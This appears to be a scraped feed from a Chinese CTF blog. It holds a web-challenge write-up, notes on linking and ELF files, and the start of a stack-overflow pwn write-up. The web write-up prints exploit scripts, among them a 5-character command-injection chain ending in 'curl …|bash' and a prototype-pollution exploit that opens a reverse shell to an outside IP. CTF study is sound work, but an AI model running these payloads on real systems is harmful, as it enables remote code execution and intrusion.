= \"\"; for ($😱😧😼🙀 = 0;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123; $😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*4].$😳😃😢🙉[$😱😧😼🙀*4+1].$😳😃😢🙉[$😱😧😼🙀*4+2].$😳😃😢🙉[$😱😧😼🙀*4+3]; $😪😾😞😀 =0; $😳😂😦😺 =0; for ($😱😽🙀🙁 =0;$😱😽🙀🙁&lt;8;$😱😽🙀🙁++) &#123; for ($😱😂🙄🙂=0;$😱😂🙄🙂&lt;16;$😱😂🙄🙂++) &#123; if($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123; $😪😾😞😀=$😱😽🙀🙁; $😳😂😦😺 = $😱😂🙄🙂; &#125; &#125; &#125; $😲😾😦🙄 = $😪😾😞😀*16+$😳😂😦😺; $😳😂😚😼 = $😳😂😚😼.(\"$😩😂😸🙉\")($😲😾😦🙄); &#125; return (\"$🎁\")($😳😂😚😼);&#125;function 😁😁() &#123; global $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍; $😳😂😖🙅😪😗😚 = 😪😗😦😺😲😂😢😼(😜😃😪😸😳😹😉😃😴😃😳🙆😱😘😢🙄😲😓😉🙊😩😧😅😻😩😽😉😄😜🙇😍😍).😪😗😦😺😲😂😢😼(😲😧😡😁)($_SERVER[😪😗😦😺😲😂😢😼(😥😻😦😞😤😁😢😖😨😀😖😕😢😖😙😍)]); 😪😗😦😺😲😂😢😼(😲😧🙄😻😱😨😙😍)($😳😂😖🙅😪😗😚); 😪😗😦😺😲😂😢😼(😩😂😸😻😱😨😙😍)($😳😂😖🙅😪😗😚); if (isset($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &amp;&amp; ($😳😃😢🙉😲😗😦🙅)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &lt;= 5) &#123; @😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]); &#125; else if (isset($_GET[😪😗😦😺😲😂😢😼(😳😽😦🙊😪😨😡😍)])) &#123; @😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)(😪😗😦😺😲😂😢😼(😳😽😀😷😜😨😚😽😙😑😍😍) . $😳😂😖🙅😪😗😚); &#125;&#125;$🎯 = new Bcrypt();$🔑 = $_POST[😪😗😦😺😲😂😢😼(😳😗😖🙊😳😃😴😻)];$🔒 = 😪😗😦😺😲😂😢😼(😚😔😚😅😚😔😕🙇😚😖😚😓😪😽😻😄😥😨😒😛😣😼😖😢😲😥🙀😕😞😻😪😅😲😘😦🙉😣😽😦🙈😲😦😑🙅😞😽😞😞😲😺😴😀😪😗😉😜😩😃🙀😝😝😾😩😅😱😖😞😺😪😔😼😆😢😗😿🙊😴😁😸😼);if($🎯-&gt;verify($🔑, $🔒)) &#123; echo(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒😂😪😨😚🙀😪😽😼😼😪😓😕😈😜😂😚🙉😠😷😍😍)); echo(😪😗😦😺😲😂😢😼(😦😂😉😃😙😣😖😟😲😃😳🙃😱😗😖😺😱🙉😒🙀😴😓😕😈😜😂😚🙉😠😷😍😍)); 😁😁();&#125; else &#123; echo(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒🙅😲😃😡😷😲😧😖😀😩😂😷😸😠😓😉😹😳😺😄😍));&#125; 首先是代码格式化，接着就是理解代码的执行逻辑，顺便改变代码逻辑 看题解上看的是第一个函数，也就是混淆 为什么要先看第一个函数 所以我们就想直接看在不同参数下第一个函数执行输出的结果，所以在第一个函数中添加 1234567891011121314151617181920212223function 😪😗😦😺😲😂😢😼($😳😃😢🙉) &#123; echo \"加密后：\".$😳😃😢🙉; global $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍; $😲😗😦🙅= (\"$😳😃😢🙉😲😗😦🙅\")($😳😃😢🙉)/4; $😳😂😚😼 = \"\"; for ($😱😧😼🙀 = 0;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123; $😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*4].$😳😃😢🙉[$😱😧😼🙀*4+1].$😳😃😢🙉[$😱😧😼🙀*4+2].$😳😃😢🙉[$😱😧😼🙀*4+3]; $😪😾😞😀 =0; $😳😂😦😺 =0; for ($😱😽🙀🙁 =0;$😱😽🙀🙁&lt;8;$😱😽🙀🙁++) &#123; for ($😱😂🙄🙂=0;$😱😂🙄🙂&lt;16;$😱😂🙄🙂++) &#123; if($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123; $😪😾😞😀=$😱😽🙀🙁; $😳😂😦😺 = $😱😂🙄🙂; &#125; &#125; &#125; $😲😾😦🙄 = $😪😾😞😀*16+$😳😂😦😺; $😳😂😚😼 = $😳😂😚😼.(\"$😩😂😸🙉\")($😲😾😦🙄); &#125; echo \"原文：\".(\"$🎁\")($😳😂😚😼); return (\"$🎁\")($😳😂😚😼);&#125; 之后依次修改代码逻辑，替换其中第一个函数输出结果 核心代码 1234567891011121314151617181920212223function 😁😁() &#123; global $🏁,$strlen,$chr,$base64_decode,$isset; $path = \"/var/www/html/sandbox/\".md5($_SERVER['REMOTE_ADDR']); mkdir($path); chdir($path); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); // &#125; else if (isset($_GET['reset'])) &#123; @exec(\"rm -rf\" . $path); &#125;&#125;$🎯 = new Bcrypt();$🔑 = $_POST[\"passwd\"];$🔒 = \"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe\";if($🎯-&gt;verify($passwd, $lock)) &#123; echo \"Password verified!\"; echo \"Wow!!Now,hack it!\"; 😁😁();&#125; else &#123; echo \"&lt;/br&gt;Password not match!&lt;/br&gt;\";&#125; 然后发现有composer包，安装，然后查资料bcrypt bcryptbcrypt是一种哈希算法，可以通过硬件进行扩展（通过可配置的循环次数）。 bcrypt是一种单向哈希算法。如果不知道盐，圆和密码（密码），则无法检索纯文本密码。 加盐： 就是人为的通过一组随机字符与用户原密码的组合形成一个新的字符，从而增加破译的难度。 在php中，主要有内置的函数password_hash和password_verify 12345678910111213141516171819$a = password_hash('password',PASSWORD_DEFAULT);echo $a.\"&lt;br&gt;\";if(password_verify('password',$a))&#123; echo \"success\";&#125;else&#123; echo \"failed\";&#125;var_dump(password_get_info($a));#输出信息array (size=3) 'algo' =&gt; int 1 'algoName' =&gt; string 'bcrypt' (length=6) 'options' =&gt; array (size=1) 'cost' =&gt; int 10$a = password_hash('password',PASSWORD_DEFAULT,array('cost' =&gt; 11));//相应的cost也会变为11； 接下来就是爆破，已知密码为bcrypt+4位小写字母 1234567891011121314151617181920&lt;?php require 'vendor/autoload.php'; use Bcrypt\\Bcrypt; $key = \"abcdefghijklmnopqrstuvwxyz\"; $bcrypt = new Bcrypt(); $plaintext = 'bcrypt';//bcryptyyds $ciphertext = '$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'; for($i=0;$i&lt;26;$i++) &#123; for($j=0;$j&lt;26;$j++) &#123; for($k=0;$k&lt;26;$k++) &#123; for($m=0;$m&lt;26;$m++) &#123; echo $plaintext.$str.PHP_EOL; $str = $key[$i].$key[$j].$key[$k].$key[$m]; if($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; echo(\"&lt;/br&gt;Password verified!&lt;/br&gt;\"); echo(\"Wow!!Now,hack it!&lt;/br&gt;\"); &#125; &#125; &#125; &#125; &#125; 命令执行最终的考点就是命令执行可以参考hitcon-ctf-2017 123456789101112function 😁😁() &#123; global $🏁,$strlen,$chr,$base64_decode,$isset; $path = \"/var/www/html/sandbox/\".md5($_SERVER['REMOTE_ADDR']); mkdir($path); chdir($path); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); // &#125; else if (isset($_GET['reset'])) &#123; @exec(\"rm -rf\" . $path); &#125;&#125; 这道题大概意思就是存在命令执行，但单次输入字符不得大于5。因此利用linux下特有的命令来写入shell反弹。原理就是利用curl ip|bash等很多方式去反弹shell。顺便也复习了反弹shell的一些基本操作 官方的脚本 12345678910111213141516171819202122232425262728293031323334353637383940import requestsimport urllibfrom time import sleepurl = \"http://219.219.61.234:10048/?cmd=\"payload = [ # generate \"g&gt; ht- sl\" to file \"v\" '&gt;dir', '&gt;sl', '&gt;g\\&gt;', '&gt;ht-', '*&gt;v', # reverse file \"v\" to file \"x\", content \"ls -th &gt;g\" ' '&gt;rev', '*v&gt;x', # generate \"curl 0X2761697D|bash\" '&gt;sh ', '&gt;ba\\\\', '&gt;\\|\\\\', '&gt;\\\\', '&gt;7D\\\\', '&gt;69\\\\', '&gt;61\\\\', '&gt;27\\\\', '&gt;0X\\\\', '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # got shell 'sh x', 'sh g',]for i in payload: assert len(i) &lt;= 5 data = &#123; 'passwd':'bcryptyyds', &#125; header = &#123; \"Content-Type\" : \"application/x-www-form-urlencoded\", \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Upgrade-Insecure-Requests\" : \"1\" &#125; r = requests.post(url + urllib.quote(i),data=data,headers=header) print(i) sleep(0.1) 这个很郁闷，配置环境很长时间还是没能弄出来 EZnode应该是国赛分区赛的题 考点nginx反向代理配置错误 首先来学习一下ngnix ngnixngnix是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器。 主要在三个方面 反向代理 负载均衡 nginx特点 反向代理 先说正向代理 客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，而不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。 上面这个图就很形象了 多个客户端给服务器发送的请求，nginx服务器接收到之后， 按照一定的规则分发给了后端的业务处理服务器进行处理了。 此时~请求的来源也就是客户端是明确的，但是请求具体由哪台服务器处理的并不明确了，nginx扮演的就是一个反向代理角色 负载均衡 在反向代理中 客户端会向服务端发出请求，而服务器将接受到的请求按照规则分发的过程，就叫做负载均衡 ngnix配置 123456789101112131415161718192021222324252627282930313233343536main # 全局配置 events &#123; # nginx工作模式配置 &#125; http &#123; # http设置 .... server &#123; # 服务器主机配置 .... location &#123; # 路由配置 .... &#125; location path &#123; .... &#125; location otherpath &#123; .... &#125; &#125; server &#123; .... location &#123; .... &#125; &#125; upstream name &#123; # 负载均衡配置 .... &#125;&#125; 发现有目录穿越漏洞参考 https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html /static../ 之后就是找cve了，比较菜，只能学习 cve-2020-7699 12345678910import requestscmd = 'bash -c \"bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1\"'# polluter1 = requests.post('http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh', files = &#123;'__proto__.outputFunctionName': ( None, \"x;process.mainModule.require('child_process').exec('&#123;&#125;');x\".format(cmd))&#125;)print(r1.text)# execute commandr2 = requests.get('http://219.219.61.234:20006/')print(r2.text) 之后反弹shell，执行命令。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"程序员的自我修养","slug":"程序员的自我修养","date":"2021-02-14T08:54:16.000Z","updated":"2021-02-14T08:56:57.211Z","comments":true,"path":"2021/02/14/程序员的自我修养/","link":"","permalink":"https://pz1o.top/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/","excerpt":"","text":"0x01 编译和链接1.被隐藏了的过程1gcc a.c 有四个过程 预处理—&gt;编译—&gt;汇编—&gt;链接 1.1 预编译预编译主要来处理那些源代码文件中的以”#”开头的预编译指令 12gcc -E a.c -o a.icpp a.c &gt; a.i 1.2 编译编译就是把预处理完的文件转化成相应的汇编代码文件 1gcc -S a.i -o a.s c编译器使用cc1 c++是cc1plus 1.3 汇编汇编器是将汇编代码转变成机器可执行的指令 简单来说就是翻译，将汇编代码与机器指令一一对照翻译 12as a.s -o a.ogcc -c a.s -o a.o 汇编器是as 从源文件开始，预编译，编译，汇编输出的文件叫做目标文件。 1.4 链接链接可以说是最难以理解的一个过程 接下来会说 2.编译器在做什么也就是上面我们说的第二步 它通常有6个过程 扫描 语法分析 语义分析 源代码优化 代码生成 目标代码优化 2.1 词法分析首先源代码会被输入到扫描器中，扫描器简单地进行词法分析，运用一种类似于有限状态机地算法将源代码地字符序列分割成一系列地记号。 记号一般为：关键字、识别符、字面量（数字和字符串等）和特殊符号（加号和等号）。 2.2 语法分析语法分析器将对由扫描器产生的记号进行语法分析，从而产生语法树 简单来说，语法分析器产生的语法树就是以表达式为节点的树 具体图可以看书 2.3 语义分析语义分析器进行语义分析 编译器所能分析的只是静态语义，与之所对应的动态语义，只有在运行过程中才可以确定 静态语义通常包括声明和类型的匹配，类型转换。 例如将浮点数赋值给指针很明显就是类型不匹配的。 经过语义分析之后，语法树上的表达式会被标识类型。 2.4 中间语言生成源码级优化器在不同编译器中会有所差别。 但作用是一样的，都是将整个语法树转换成中间代码。 中间代码·使得编译器生成前端和后端。前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。 2.5 目标代码生成与优化编译器后端主要包括代码生成器和目标代码优化器 代码生成器：将中间代码转换成机器代码，不同机器的不同字长、寄存器、整数数据类型、浮点数数据类型都会影响代码生成器。 我们经过以上步骤生成的代码全都是未经链接的目标代码，最终都需要通过链接器将目标文件链接起来产生可执行文件。 3.链接器重定位：重新计算各个目标地址过程 符号：用来表示一个地址，可能是一段子程序的起始地址，或一个变量的起始地址 4.静态链接每个源码独立地编译，然后按照需要将他们组装起来，组装模块的过程叫做链接。 链接过程包括地址空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定位（Relocation） 符号决议和符号绑定大体是差不多的，但决议用于静态链接，绑定用于动态链接 如图所示，源代码文件编译成目标文件，目标文件和库一起链接成可执行文件。 举个例子 在main.c中需要其他模块fun.c中的foo() 所以我们在main.c中每一处调用foo的时候都必须知道foo这个函数的地址，但由于是单独编译的 我们并不知道这个地址，若无链接器，我们需要手动修正地址 通过链接器我们可以直接引用foo而无需知道它的地址，因为链接器在链接的时候，会根据所引用的符号foo，自动去相应的模块查找foo的地址，并将main中foo的地址重新修正 0x02 目标文件我们上面已经知道源代码经过预处理，编译，汇编产生的文件就叫目标文件。 目标文件其实是已经编译后的可执行文件，只是有些符号和地址未被调整，本身就是按照可执行文件格式存储的，但和真正可执行文件还有所不同。 可以先来看一下 下面我们将讲这个文件到底是什么 1.目标文件的格式我们熟知的windows下的PE（Portable Executable）和Linux的ELF（Executable Linkable Format）的是可执行文件 目标文件就是源代码编译后但未进行链接的中间文件。它与可执行文件的内容和结构很相似，所以一般跟可执行文件格式一起用一种格式存储。 此外，还有其他可执行文件格式OMF（Object Module Format）和Unix a.out格式和MS-DOS.COM格式等。 动态链接库（Dynamic Linking Library）（windows下的dll和linux中的so）及静态链接库（Static Linking Libary）（windows下的lib和Linux中的a）都按照可执行文件格式存储 静态链接库是一个包含有很多目标文件的文件包 文件格式如下 ELF文件类型 说明 实例 重定位文件(Relocatable File) 包含代码和数据，可以被链接成可执行文件或目标文件 Linux中.o Win下的obj 可执行文件(Executable File) 可以执行的程序,通常无扩展名 Linux中.out Win下的.exe 共享目标文件(Shared Object File) 包含代码和数据，有两种情况。第一种是链接器可以使用这种文件跟其他的重定位文件和共享目标文件进行链接产生新的目标文件。第二种事动态链接器可以将几个共享目标文件与可执行文件结合，作为进程映像的一部分来运行 Linux中.so和Win中DLL 核心转储文件(Core Dump File) 当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其他信息转储到核心转储文件 Linux中的Core Dump 2.目标文件是什么样的目标文件除了机器指令代码、数据，还包括了链接时所需要的一些信息，比如符号表、调试信息和符号串等。 目标文件通常将这些信息按不同的属性，以节（Section）来存储，也叫段（Segment） 我们熟知的代码段、数据段就是这个东西 代码段存储代码叫.code或.text 数据段存储全局变量和局部静态变量叫.data 从这个图中可以看到，ELF文件的开头是一个文件头，它描述了整个文件的文件属性，包括文件是否可执行、是静态链接还是动态链接、目标硬件、目标操作系统等各种信息 此外，文件头还有一个段表， 段表是一个描述文件中各个段的数组。段表描述了文件中各个段在文件中的偏移位置以及段的属性等，从段里面可以得到每个段的所有信息。 文件头之后就是各个段的内容 .text：存储c语言编译后的执行语句编译成的机器代码 .data：存储已初始化的全局变量和局部静态变量 .bss：存储未初始化的全局变量和局部静态变量 那么为什么要设置bss段呢？ 在程序中，未初始化的变量是0，如果把他们放在data段并分配空间赋值0是完全浪费空间的一种做法， 所以可执行文件为了记录所有未初始化的全局变量和局部静态变量的大小总和，记做bss段 bss段只是为未初始化的全局变量和局部静态变量预留位置而已，并没有内容，在文件中也不占空间 总体来说，程序源代码被编译以后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和bss段属于程序数据。 3.挖掘SimpleSection.o这里我们换成a.o 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int global_init_var = 84;int global_uninit_var;void func1(int i)&#123; printf(\"%d\\n\",i);&#125;int main(void)&#123; static int static_var = 85; static int static_var2; int a = 1; int b; func1(static_var + static_var2 + a + b); return 0;&#125; 编译一下 现在我们来具体分析一下 123$ objdump -h a.o&#x2F;&#x2F;-h将基本信息打印出来&#x2F;&#x2F;-x打印更多信息 代码段，数据段，bss段我们已经知道了 可以看到还有只读数据段.rodata 注释段.comment 堆栈提示段.note.GNU-stack段 下面第二行CONTENTS ALLOC表示段的各种属性，CONTENTS表示该段在文件中存在 看到BSS段是没有CONTENTS表示它实际在ELF文件中不存在内容 下面我们就来看一下各个段的分布 这里和书上不同的是.note.GNU-stack占了内容，那么我们也把他写上 3.1 代码段123$ objdump -s -d a.o&#x2F;&#x2F;-s 将段内容按照16进制打印&#x2F;&#x2F;-d 可以将所有包含指令的段反汇编 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768a.o： 文件格式 elf32-i386Contents of section .text: 0000 5589e583 ec0883ec 08ff7508 68000000 U.........u.h... 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404 .............L$. 0020 83e4f0ff 71fc5589 e55183ec 14c745f0 ....q.U..Q....E. 0030 01000000 8b150400 0000a100 00000001 ................ 0040 c28b45f0 01c28b45 f401d083 ec0c50e8 ..E....E......P. 0050 fcffffff 83c410b8 00000000 8b4dfcc9 .............M.. 0060 8d61fcc3 .a.. Contents of section .data: 0000 54000000 55000000 T...U... Contents of section .rodata: 0000 25640a00 %d.. Contents of section .comment: 0000 00474343 3a202855 62756e74 7520352e .GCC: (Ubuntu 5. 0010 342e302d 36756275 6e747531 7e31362e 4.0-6ubuntu1~16. 0020 30342e31 32292035 2e342e30 20323031 04.12) 5.4.0 201 0030 36303630 3900 60609. Contents of section .eh_frame: 0000 14000000 00000000 017a5200 017c0801 .........zR..|.. 0010 1b0c0404 88010000 1c000000 1c000000 ................ 0020 00000000 1c000000 00410e08 8502420d .........A....B. 0030 0558c50c 04040000 28000000 3c000000 .X......(...&lt;... 0040 1c000000 48000000 00440c01 00471005 ....H....D...G.. 0050 02750043 0f03757c 06750c01 0041c543 .u.C..u|.u...A.C 0060 0c040400 .... Disassembly of section .text:00000000 &lt;func1&gt;: 0: 55 push %ebp 1: 89 e5 mov %esp,%ebp 3: 83 ec 08 sub $0x8,%esp 6: 83 ec 08 sub $0x8,%esp 9: ff 75 08 pushl 0x8(%ebp) c: 68 00 00 00 00 push $0x0 11: e8 fc ff ff ff call 12 &lt;func1+0x12&gt; 16: 83 c4 10 add $0x10,%esp 19: 90 nop 1a: c9 leave 1b: c3 ret 0000001c &lt;main&gt;: 1c: 8d 4c 24 04 lea 0x4(%esp),%ecx 20: 83 e4 f0 and $0xfffffff0,%esp 23: ff 71 fc pushl -0x4(%ecx) 26: 55 push %ebp 27: 89 e5 mov %esp,%ebp 29: 51 push %ecx 2a: 83 ec 14 sub $0x14,%esp 2d: c7 45 f0 01 00 00 00 movl $0x1,-0x10(%ebp) 34: 8b 15 04 00 00 00 mov 0x4,%edx 3a: a1 00 00 00 00 mov 0x0,%eax 3f: 01 c2 add %eax,%edx 41: 8b 45 f0 mov -0x10(%ebp),%eax 44: 01 c2 add %eax,%edx 46: 8b 45 f4 mov -0xc(%ebp),%eax 49: 01 d0 add %edx,%eax 4b: 83 ec 0c sub $0xc,%esp 4e: 50 push %eax 4f: e8 fc ff ff ff call 50 &lt;main+0x34&gt; 54: 83 c4 10 add $0x10,%esp 57: b8 00 00 00 00 mov $0x0,%eax 5c: 8b 4d fc mov -0x4(%ebp),%ecx 5f: c9 leave 60: 8d 61 fc lea -0x4(%ecx),%esp 63: c3 ret 通过上面这段代码 我们对文件内容有了更深入的了解 最左面是偏移量，中间是16进制内容，右面是ascii形式 反汇编结果我们也很熟悉 3.2 数据段和只读数据段.data段保存已经初始化了的全局静态变量和局部静态变量,所以上面程序中.data是八个字节 .rodata存放只读数据，一般是程序里面的只读变量和字符串常量，例如上面中printf的参数%d\\n\\0是四个字节 1234Contents of section .data: 0000 54000000 55000000 T...U... Contents of section .rodata: 0000 25640a00 %d.. 也可以看出.data是84 85从低到高是0x54 0x00 0x00 0x00 .rodata是%d\\n\\0 3.3 BSS段.bss段存储未初始化的全局变量和局部静态变量。 3.4 其他段 这些段都是由.来做前缀，说明这些表的名字是系统保留的。我们可以自定义段名，并在文件中插入这个段，达到自己想干的事情。 将一个二进制文件如图片，音乐作为目标文件的一个段 12objcopy -I binary -O elf32-i386 -B i386 image.jpg image.oobjdump -ht image.o 4.ELF文件结构描述 ELF目标文件格式最前面是ELF文件头，包含整个文件的基本属性，如ELF文件版本、目标机器型号、程序入口地址等。 在ELF文件中与段有关的重要结构就是段表(Section Hearder Table)，该表描述了ELF文件包含的所有段的信息，如每个段的段名、段的长度、在文件中的偏移和读写权限等。 4.1 文件头查看ELF文件 ELF头中包括了魔数，文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、重定位类型、硬件平台、平台版本、入口地址、程序头入口和长度、段表位置和长度及段的数量 为了更好定义各个成员大小、elf.h有一套自己变量体系 下面来看一下“Elf32_Ehdr”这个结构体 之后我们来对照一下 这里具体来说一下魔数 魔数： ELF的魔数上面我们可以看到是16字节，也就是对应的16个数组 最开始的4个字节是ELF文件必须相同的标识码 为0x7F 0x45 0x4C 0x46 7F是ascii中的DEL控制符，45 4c 46分别是ascii中的ELF。几乎所有可执行文件格式开始都是魔数，如a.out的0x01 0x07，PE中的0x4d 0x5a。 那么魔数是来干什么的？模式是用来确认文件的类型，操作系统在加载可执行文件的时候会确认魔数是否正确，如果不正确将会拒绝加载。 下一个字节是0x01表示32位 0x02表示64位 第6个字节序 规定是大端还是小端 第7个是主版本号，一般为1。后面的9个一般填0 文件类型 e_type成员表示文件类型，就是前面说的三种文件类型。 操作系统通过这个来判断ELF文件类型，而不是通过后缀名。 4.2 段表段表（Section Header Table）是保存这些段的基本属性的结构。 可以说，ELF文件的段结构就是由段表来决定的，编译器、链接器、和装载器都是依靠段表来定位和访问各个段的属性的。 段表由ELF文件头的e_shoff成员决定。 下面我们来看一下真正的段 12$ readelf -S a.o&#x2F;&#x2F;各个段 每个段都是以Elf32_Shdr结构体，因此Elf32_Shdr又叫做段描述符 所以上面就是有13个结构体，此外第一个是无用的，所以只有12个有效段。 可以来看一下Elf32_Shdr 段的类型 段的名字只在链接和编译中有意义，但不能真正表示段的类型。 对于编译器和链接器来说，主要决定段的属性是段的类型（sh_type）和段的标志位(sh_flags) 段的标志位 段的标志位表示该段在进程虚拟地址空间中的属性，如是否可写可执行等。 段的链接信息 如果段类型是与链接相关的，如重定位表、符号表等，那么sh_link和sh_info是有意义的 4.3 重定位表链接器在处理目标文件时，需要对目标文件中某些部位进行重定位，即代码段和数据段中那些对绝对地址引用的位置。这些重定位记录都会记录在重定位表里。 .rel.text就是一个重定位表。 每个重定位的段都会有一个相应的重定位的表。 如.text中有printf的调用，所以就会有.rel.text而.data就没有重定位的。 重定位表同时也是ELF的一个段，所以这个段的类型就是SHT_REL类型。sh_link就是符号表的下标，sh_info就是作用于哪个段。 4.4 字符串表字符串由于比较复杂，所以把字符串集中在一个表里就很简便，然后用偏移来表示字符串。 5.符号在链接中，目标文件中间相互拼合实际上是目标文件之间对地址的引用。即对函数和变量的地址的引用。 如目标文件B用目标文件A中foo函数，那么就是目标文件A定义了foo，目标文件B引用了foo。 在链接中，我们将函数和变量统称为符号，函数名和变量名为符号名 在链接过程中很关键就是符号的管理，每一个目标文件都会有一个相应的符号表，这个表里面记录了目标文件用到的所有符号。每个定义的符号有一个对应的值叫符号值，符号值就是地址。 具体符号有下面几种类型 12$ nm a.o&#x2F;&#x2F;看符号 5.1 ELF符号表结构ELF文件中符号表往往是一个段，一般叫做.symtab。符号表的结构是一个ELF32_Sym结构的数组，每个结构都是一个符号。 Elf32_Sym的结构定义 成员意义如下图 符号类型和绑定信息（st_info） 成员低4为是符号的类型，高28为表示符号绑定信息 符号所在段（st_shndx） 如果符号定义在本目标文件中，这个成员表示符号所在的段在段表的下标；但如果符号不是定义在本目标文件中，或者对于有些特殊符号，sh_shndx的值会有些特殊 符号值 上文说了，符号值就是每一个符号的变量地址 具体来说，有以下几种类型 看一下我们的符号表 1readelf -s a.o 第一列Num就是数组下标，从零开始 第二列vaule就是符号值，st_value 第三列Size为符号大小st_size 第四列和第五列为符号类型和绑定信息 第七列就是Ndx即st_shndx表示符号所在的段。 最后一列就是符号名称 具体解释如下 5.2 特殊符号特殊符号就是你无须定义它们，但你可以声明并使用他们。 并且只有用ld链接器生产最终可执行文件这些符号才会存在，链接器会在将程序最终链接成可执行文件是将其解析成正确的值。 后面的签名、强弱就跳过了，需要时继续研究。 0x03 静态链接","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"一道栈题","slug":"一道栈题","date":"2021-02-14T08:54:00.000Z","updated":"2021-02-14T11:40:29.979Z","comments":true,"path":"2021/02/14/一道栈题/","link":"","permalink":"https://pz1o.top/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/","excerpt":"","text":"ciscn_2019_s_3国赛的一道栈题 main函数 vuln函数 gadgets函数 看一下gadgets函数 里面有0f（15）和3b（59）看一下这两个是什么 15 sys_rt_sigreturn59 sys_execve 接下来说一下syscall syscall什么时syscall 看wiki 在32位和64位中是有些不同的 32位： 传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器 调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4 调用方式: 使用 int 80h 中断进行系统调用 64位： 传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器 调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1 stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15 调用方式: 使用 syscall 进行系统调用 wp接下来继续看题解 从汇编中我们可以看到 在vuln函数中有栈溢出 同时这个题还有一个地方 就是最后时没有leave的 也就是offset是0x10，之后就是返回地址 接下来看gadgets 它里面有两个调用号 12mov rax，0Fh &#x2F;&#x2F; 0Fh 即15 而15 对应的是 sys_rt_sigreturn系统调用mov rax，3Bh &#x2F;&#x2F; 3Bh 即 59 而15 对应的是 sys_execve 系统调用 所以有两种方法 12第一种：利用 ret2__libc_csu_init 去构造 execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) 来 getshell第二种：直接srop 伪造 sigreturn frame 去 构造 execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) 来 getshell 第一种ret2__libc_csu_init既然想系统调用，我们就得传参 123rdi &quot;&#x2F;bin&#x2F;sh&quot;的指针rsi 0rdx 0 首先想到的肯定是gadget rdi rsi 都有了但问题是没有rdx 这时就可以看ida了 看到有rdx 这样我们就可以利用gadget了，但问题是要想获得/bin/sh的指针 就需要知道栈上的地址 也不知道是什么，看网上wp，都说write中有，调试了一下确实 原因不太清楚 接下来就是写wp了 第一步我们需要得到bin/sh的指针 接下来第二步就是ROP，这里有一个不好理解的就是 1call qword ptr [r12+rbx*8] 因为我们r12是指向栈上的,且rbx每次都是加一，这样其实就利用了我们的gadget 最后就是循环调用上面的call，知道系统调用 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *#from LibcSearcher import *#context.os='linux'#context.log_level='debug'#context.arch = elf.archs = lambda data :p.send(str(data))sa = lambda delim,data :p.sendafter(str(delim), str(data))sl = lambda data :p.sendline(str(data))sla = lambda delim,data :p.sendlineafter(str(delim), str(data))r = lambda num=4096 :p.recv(num)ru = lambda delims, drop=True :p.recvuntil(delims, drop)itr = lambda :p.interactive()uu32 = lambda data :u32(data.ljust(4,'\\0'))uu64 = lambda data :u64(data.ljust(8,'\\0'))leak = lambda name,addr 